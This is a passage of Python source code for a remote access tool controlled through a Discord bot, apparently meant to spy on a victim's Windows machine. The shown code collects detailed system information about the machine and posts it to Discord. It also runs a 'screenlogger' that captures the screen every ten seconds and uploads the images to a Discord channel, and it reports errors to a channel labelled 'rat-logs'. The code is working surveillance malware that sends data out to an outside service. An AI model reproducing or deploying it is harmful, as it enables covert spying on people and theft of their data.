    virtual_memory_in_use = get_virtual_memory_in_use(os_info)
    page_file_locations = get_page_file_locations(os_info)
    domain = get_domain(os_info)
    logon_server = get_logon_server(os_info)
    hotfixes = get_hotfixes(os_info)
    network_cards = get_network_cards(os_info)
    hyperv_requirements = get_hyperv_requirements(os_info)
    battery_percentage = get_battery_percentage(os_info)

    info_message = f"OS Version: {os_version}\n" \
                   f"OS Manufacturer: {os_manufacturer}\n" \
                   f"OS Configuration: {os_configuration}\n" \
                   f"OS Build Type: {os_build_type}\n" \
                   f"Registered Owner: {registered_owner}\n" \
                   f"Registered Organization: {registered_organization}\n" \
                   f"Product ID: {product_id}\n" \
                   f"Original Install Date: {original_install_date}\n" \
                   f"System Boot Time: {system_boot_time}\n" \
                   f"System Manufacturer: {system_manufacturer}\n" \
                   f"System Model: {system_model}\n" \
                   f"System Type: {system_type}\n" \
                   f"Processors: {processors}\n" \
                   f"BIOS Version: {bios_version}\n" \
                   f"Windows Directory: {windows_directory}\n" \
                   f"System Directory: {system_directory}\n" \
                   f"Boot Device: {boot_device}\n" \
                   f"System Locale: {system_locale}\n" \
                   f"Input Locale: {input_locale}\n" \
                   f"Time Zone: {time_zone}\n" \
                   f"Available Physical Memory: {available_physical_memory}\n" \
                   f"Virtual Memory: Max Size: {virtual_memory_max_size}\n" \
                   f"Virtual Memory: Available: {virtual_memory_available}\n" \
                   f"Virtual Memory: In Use: {virtual_memory_in_use}\n" \
                   f"Page File Location(s): {page_file_locations}\n" \
                   f"Domain: {domain}\n" \
                   f"Logon Server: {logon_server}\n" \
                   f"Hotfix(s): {hotfixes}\n" \
                   f"Network Card(s): {network_cards}\n" \
                   f"Hyper-V Requirements: {hyperv_requirements}\n" \
                   f"Battery Percentage: {battery_percentage}\n"

    # Split the message into smaller parts if it exceeds the character limit
    messages = []
    while len(info_message) > 0:
        messages.append(info_message[:2000])
        info_message = info_message[2000:]

    for message in messages:
        code_block_message = f"```{message}```"  # Send As A Box
        await ctx.send(code_block_message)



screen_share_enabled = False  # Define screen_share_enabled globally

@bot.command()
async def screen_share(ctx, state: str):  # Make sure state is explicitly typed as a string
    global screen_share_enabled

    channel_name = '・📱│ꜱᴄʀᴇᴇɴʟᴏɢꜱ'

    if state == 'on':
        if not screen_share_enabled:
            screen_share_enabled = True
            asyncio.create_task(send_logs_and_screenshot(ctx))  # Pass ctx as an argument
            await ctx.send('Screenlogger is now ``Enabled 🟢``')
        else:
            await ctx.send('Screenlogger is **Already** ``Enabled 🟢``')
    elif state == 'off':
        if screen_share_enabled:
            screen_share_enabled = False
            await ctx.send('Screenlogger is now ``Disabled ⚫``')
        else:
            await ctx.send('Screenlogger is **Already** ``Disabled ⚫``')
    else:
        await ctx.send('Invalid state. Please use `on` or `off`.')

# Start logging command
@bot.command()
async def start_logging(ctx):
    global screen_share_enabled
    screen_share_enabled = True
    await send_logs_and_screenshot(ctx)


    

# Stop logging command
@bot.command()
async def stop_logging(ctx):
    global screen_share_enabled
    screen_share_enabled = False
    await ctx.send("Screen logging stopped.")

# Function to send logs and screenshot
async def send_logs_and_screenshot(ctx):  # Add ctx as a parameter
    global screen_share_enabled

    while screen_share_enabled:
        # Capture screenshot
        screenshot = pyautogui.screenshot()
        screenshot_bytes = BytesIO()
        screenshot.save(screenshot_bytes, format='PNG')
        screenshot_bytes.seek(0)

        # Create the embed object
        embed = discord.Embed(title='Screenshot', color=discord.Color.blue())

        # Attach the screenshot to the embed
        file = discord.File(screenshot_bytes, filename='screenshot.png')

        embed.set_image(url='attachment://screenshot.png')

        # Send the embed message to the specified channel
        channel_name = '・📱│ꜱᴄʀᴇᴇɴʟᴏɢꜱ'
        channel = discord.utils.get(ctx.guild.channels, name=channel_name)
        if channel:
            await channel.send(embed=embed, file=file)
        else:
            await ctx.send(f"Channel '{channel_name}' not found.")
            screen_share_enabled = False  # Stop logging if the channel is not found

        # Schedule the next execution of the coroutine after 10 seconds
        await asyncio.sleep(10)
















#error handling
@bot.event
async def on_command_error(ctx, error):
    # Fetch the desired channel
    channel = discord.utils.get(ctx.guild.channels, name='・🔔│ʀᴀᴛ-ʟᴏɢꜱ')

    if channel is not None:
        # Log the command error
        if isinstance(error, commands.CommandNotFound):
            error_message = f"Command `{ctx.message.content}` is not found"
        else:
            error_message = f"An error occurred in command '{ctx.message.content}': {error}"

        await channel.send(error_message)
    else:
        print(f"Error channel '・🔔│ʀᴀᴛ-ʟᴏɢꜱ' not found or bot doesn't have access.")
# Run the bot with the token
bot.run(DISCORD_BOT_TOKEN)
